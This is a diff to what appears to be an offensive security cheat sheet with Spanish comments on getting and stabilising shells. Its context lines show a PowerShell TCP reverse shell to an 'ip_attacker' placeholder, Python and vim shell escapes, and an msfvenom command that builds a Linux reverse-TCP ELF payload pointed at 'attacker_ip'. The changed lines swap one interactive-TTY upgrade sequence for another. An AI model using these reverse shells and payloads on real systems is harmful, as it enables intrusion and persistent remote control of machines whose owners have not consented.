@@ -15,8 +15,6 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ip_attack
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 #Shell TTY con python
 
-(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
-
 /bin/sh -i
 #Shell interact con bash
 
@@ -32,6 +30,12 @@ vim
 :set shell=/bin/sh
 :shell
 #Salir de vim
+
+script /dev/null -c bash
+CTR+Z
+stty raw -echo;fg
+reset xterm
+#Obtener sesion tty
 
 ---     MSFvenom        ---
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=443 -f elf > file.elf
